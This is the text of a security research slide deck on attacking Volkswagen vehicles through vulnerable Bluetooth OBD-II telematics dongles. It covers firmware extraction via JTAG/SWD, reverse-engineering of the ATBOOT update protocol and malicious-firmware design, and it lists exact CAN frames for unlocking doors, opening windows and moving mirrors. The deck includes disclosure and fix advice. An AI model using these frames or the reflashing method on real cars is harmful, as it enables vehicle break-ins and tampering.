REMOTE ATTACKS ON VEHICLES BY EXPLOITING VULNERABLE TELEMATICS
Dawei Lyu, Lei Xue, Le Yu, Xiapu Luo cslxue@comp.polyu.edu.hk Department of Computing
The Hong Kong Polytechnic University
1

2

CONTENT
Telematics Attack Surface Vulnerable Telematics A Vulnerable Telematics B Attacks via Compromised Telematics Systems Suggestions on Fixing the Vulnerability Conclusion
3

TELEMATICS
4

TELEMATICS
5

TELEMATICS
CAN Bus ECU

OBD II

OBD Device

Bluetooth
Smartphone with App

Internet

6

CAN BUS

Twisted pair

Controller Area Network

- Data exchange among ECUs

Differential signal

(Electronic Control Unit)

- More than one CAN bus in a vehicle

Eg: Infotainment CAN bus, Comfort CAN bus,

Diagnostic CAN bus

- Each CAN bus has several ECUs

7

CAN BUS
 Messages in different CAN buses are exchanged via gateway
 OBD-II port is directly connected to gateway.
 External devices plugged into OBD port access ECUs through gateway.
8

CAN MESSAGES

Frame ID: 0x7DF DLC: 0x8 Data: 02 09 00 00 00 00 00 00 Require for Mode9 Supported PIDs List
Frame ID: 0x7E8 DLC: 0x8 Data: 06 49 00 54 40 00 00 00 Response from Vehicle
9

OBD-II
On-Board Diagnostic  Conduct emissions-related diagnostics
· Status, DTC...
 Access selected or all ECUs
· Diagnosis, Re-Configuration, Update
 Action testing  It can be exploited to attack the vehicle if a malicious dongle is plugged into it.
10

OBD-II
16 Pins interface serving for different protocols - Pin 2&10: SAE J1850PWM, SAE J1850 VPM - Pin 6&14: ISO 15765, CAN bus! Winner! - Pin 7&15: ISO 9141-2, KWP2000
11

CONTENT
Telematics Attack Surface Vulnerable Telematics A Vulnerable Telematics B Attacks via Compromised Telematics Systems Suggestions on Fixing the Vulnerability Conclusion
12

ATTACK SURFACE
App: Secret in apps, Lack of binary protection, Insecure Data Storage, Data leakage ... Device: Does not verify the signature of firmware, Poor authentication, Trust the app, ... Communication: Default PINs, No encryption, Vulnerable to MITM attack, ...
GSM/3G/LTE/WiFi
Bluetooth
13

DISCLAIMER
For the following vulnerable telematics devices, we have informed the corresponding companies about the vulnerabilities and how to patch them with the help of HKCERT.
14

CONTENT
Telematics Attack Surface Vulnerable Telematics A Vulnerable Telematics B Attacks via Compromised Telematics Systems Suggestions on Fixing the Vulnerability Conclusion
15

VULNERABLE TELEMATICS A
OBD Device A  Microprocessor + Bluetooth + CAN
Top Board: Bluetooth
Communicate with its app through Bluetooth
Bottom Board: MCU + CAN
16

VULNERABLE TELEMATICS A Monitor CAN Bus (Pin 6&14) Data

Since the firmware is not protected, we can fetch it via SWD or JTAG directly.

Monitor Bluetooth Communication (between MCU and Bluetooth device)
17

VULNERABLE TELEMATICS A

Extract the original firmware!
SWD Mode GND VCC SWDIO SWCLK

J-Link: JTAG debug tool JTAG Connector

SWD Connector

JLINK

18

VULNERABLE TELEMATICS A
Extract the original firmware!
JTAG Connection Read via JLINK

Success!
19

VULNERABLE TELEMATICS A

Firmware with IAP function

Perform IAP function Boot Part

Boot Part

Perform Real functions Application Part

Set flag, goto Boot

IAP, Clear Flag

Application Part

20

VULNERABLE TELEMATICS A

Bluetooth Communication Data

Analyze application part of the firmware Commands

Read Bin

APP Logs: Control Data
21

VULNERABLE TELEMATICS A

The bin file in the smartphone.

The firmware extracted from the device.

Confirmed! The boot part ends at 8001FFF, and the application part starts at 8002000.
22

VULNERABLE TELEMATICS A
23

VULNERABLE TELEMATICS A
Code Snippet: No obfuscation ! ! !
24

VULNERABLE TELEMATICS A
Bluetooth connection between the app and the device.

Start Scan and find he device

BluetoothAdapter.startDiscovery()

Connect to the device

BluetoothAdapter.getRemoteDevice()

Create socket for communication BluetoothDevice.createInsecureRfcommSocketToServiceRecord()

Establish socket connection

BluetoothSocket.connect()

Get input and output stream BluetoothSocket.getInputStream() And BluetoothSocket.getOutputStream()
25

VULNERABLE TELEMATICS A

BluetoothSocket.write(byte[]) BluetoothSocket.flush()
Send command

Execute the commands

Receive response
BluetoothSocket.read()
26

VULNERABLE TELEMATICS A
Dumping the data sent through Bluetooth
/src/framework/base/core/java/android/bluetooth/BluetoothSocket.java 27

VULNERABLE TELEMATICS A
Req: ATRV (Lookup the output voltage) Ack:11.70
28

VULNERABLE TELEMATICS A

ATLOCK0

Reverse-engineering the firmware update protocol

ATBOOT ATBOOT

ATBOOT

Split the bin file into fragments (256 bytes)

ATBOOT Send the 1st fragment Send the 2nd fragment Send the last fragment

Send "0x04"

ACK: >OK ACK: ELM 327 V1.5 ACK: XXXXXX 627 V1.6.1035 ACK: >ATBOOT ACK: 0x15 0x42 ACK: 0x06 0x44 0x0D
ACK: 0x06 0x44 0x0D ACK: 0x06 0x44 0x0D ACK: 0x06 0x44 0xC0oDmplete and29Reboot!

CONTENT
Telematics Attack Surface Vulnerable Telematics System A Vulnerable Telematics System B Attacks via Compromised Telematics Systems Suggestions on Fixing the Vulnerability Conclusion
30

VULNERABLE TELEMATICS B
OBD Device B  Microprocessor + Bluetooth + CAN1/CAN2 + Sensor  No (firmware) W/R protection  Communicate with its app through Bluetooth
Bottom Board: MCU + CAN + Sensor

Top Board: Bluetooth
31

VULNERABLE TELEMATICS B
Extract the original firmware!
Since the firmware is not protected, we can extract it via SWD or JTAG directly.

Monitor CANbus Data
Monitor Bluetooth Communication
32

VULNERABLE TELEMATICS B
Analyze the firmware

Commands

Firmware Version

33

VULNERABLE TELEMATICS B

Analyze the firmware

Firmware from the device

Firmware from the app

Confirmed! The boot part ends at 8001FFF, and the application part starts at 8002000 (default)

34

VULNERABLE TELEMATICS B
35

VULNERABLE TELEMATICS B
Code Snippet: Obfuscated ! ! !
36

VULNERABLE TELEMATICS B
It employs the public API for the Bluetooth GATT (Generic Attribute) Profile to conduct the communication.
Bluetooth 4.0 stack
37

VULNERABLE TELEMATICS B

Communicate with the device through Bluetooth Low Energy (BLE).
Start

Scan and find the device Connect to the device

BluetoothAdapter.startDiscovery() BluetoothAdapter.getRemoteDevice()

Connect to GATT server hosted by the device BluetoothDevice.connectGatt(Context, boolean, callback)

Get the services supported by the device

BluetoothGatt.getService(UUID)

Select the characteristic for sending command BluetoothGattService.getCharacteristics()
38

VULNERABLE TELEMATICS B
Execute the commands
BluetoothGattCharacteristic.setValue(byte[]) BluetoothGatt.writeCharacteristic()
Send command to the BLE device.
Receive response
BluetoothGatt.onNotify()
39

VULNERABLE TELEMATICS B
Dumping the data sent through BLE.
/src/framework/base/core/java/android/bluetooth/BluetoothGatt.java 40

VULNERABLE TELEMATICS B
Req: ATI (Query the firmware version) Ack: 3.3.0.7
41

VULNERABLE TELEMATICS B

Reverse-engineering the firmware update protocol
Split the bin file into fragments (256 bytes)

ATBOOT ATBOOT
Send the 1st fragment

Send the 2nd fragment

Send the last fragment Send "0x04"

ACK: 0x15 ACK: 0x06 ACK: 0x06 ACK: 0x06 ACK: 0x06

Complete and42Reboot

CONTENT
Telematics Attack Surface Vulnerable Telematics System A Vulnerable Telematics System B Attacks via Compromised Telematics Systems Suggestions on Fixing the Vulnerability Conclusion
43

ATTACKS VIA COMPROMISED TELEMATICS SYSTEMS
Attacks - Control: Lock&Unlock doors, Open&Close Windows, Open&Close Mirror - Re-Configuration of ECUs - ...
44

ATTACKS VIA COMPROMISED TELEMATICS SYSTEMS

Prepare the POC malicious firmware

Re-Implement some original
functions

Attack Functions

Drivers

Power

CAN

Bluetooth

Automated attacks that will be executed if
conditions are satisfied.
Customized attacks triggered by
commands sent through Bluetooth

Hardware

Attack Methods

45

ATTACKS VIA COMPROMISED TELEMATICS SYSTEMS
Test Vehicles - Tiguan 2015 1.8T - Magotan 2015 1.8T
Vehicles running the same platform from Volkswagen can also be controlled by the OBD messages shown in the following slides!
46

ATTACKS

Unlock Doors

CAN ID 0x74A

DLC

DATA

8 {0x10,0x08,0x2F,0x04,0x03,0x03,0xFF,0x03} 8 {0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00} 8 {0x30,0x00,0x14,0x00,0x00,0x00,0x00,0x00}

Lock Doors

CAN ID 0x74A

DLC

DATA

8 {0x10,0x08,0x2F,0x04,0x03,0x03,0xFF,0x01}

8 {0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00}

8 {0x30,0x00,0x14,0x00,0x00,0x00,0x00,0x00}

47

ATTACKS

Open Windows

CAN ID
0x74A 0x74B

DLC

DATA

8 {0x10,0x08,0x2F,0x04,0x02,0x03,0x05,0x00}

8 {0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00} 8 {0x30,0x00,0x14,0x00,0x00,0x00,0x00,0x00}

0x74A 0x74B

8 {0x10,0x08,0x2F,0x04,0x06,0x03,0x05,0x00} 8 {0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00} 8 {0x30,0x00,0x14,0x00,0x00,0x00,0x00,0x00}

CAN ID
0x74A 0x74B

Close Windows

DLC

DATA

8 {0x10,0x08,0x2F,0x04,0x01,0x03,0x0A,0x00}

8 {0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00}

8 {0x30,0x00,0x14,0x00,0x00,0x00,0x00,0x00}

0x74A 0x74B

8 {0x10,0x08,0x2F,0x04,0x05,0x03,0x0A,0x00} 8 {0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00} 8 {0x30,0x00,0x14,0x00,0x00,0x00,0x00,0x00}
48

ATTACKS

Close Outside Rear View Mirror

CAN ID 0x74A

DLC

DATA

8 {0x10,0x08,0x2F,0x04,0x0C,0x03,0xFF,0x01}

8 {0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00}

8 {0x30,0x00,0x14,0x00,0x00,0x00,0x00,0x00}

Open Outside Rear View Mirror

CAN ID DLC

DATA

8 {0x10,0x08,0x2F,0x04,0x0C,0x03,0xFF,0x02}

0x74A

8 {0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00}

8 {0x30,0x00,0x14,0x00,0x00,0x00,0x00,0x00}

49

VIDEO DEMO1
50

VIDEO DEMO2
51

CONTENT
Telematics Attack Surface Vulnerable Telematics A Vulnerable Telematics B Attacks via Compromised Telematics Systems Suggestions on Fixing the Vulnerability Conclusion
52

HOW TO FIX THE VULNERABILITY?
 The device should verify the signature of a firmware before installing it;  Mutual authentication;  The communication between the app and the device should be protected by keys/PINs specific to individual users;  Hardened the apps and do not leave secrete (e.g., .bin and PINs) in the apps.
53

CONCLUSIONS
 Discover severe vulnerabilities in popular telematics systems.  Confirm these vulnerabilities through POC attacks on real vehicles.  Propose approaches for fixing these vulnerabilities.  Notify the companies.
54

WE ARE LOOKING FOR
 PhD students with full scholarship  Postdoctoral Fellow and Research Assistants with competitive salary
 Topics:
 Android or System Security and Privacy,  Network Security and Privacy  Blockchain technology  Accountable anonymous credentials  Searchable encryption
 Contact:
 Dr. Xiapu Luo (https://www4.comp.polyu.edu.hk/~csxluo/)  Dr. Man Ho Allen Au (http://www.comp.polyu.edu.hk/~csallen/)
55

56

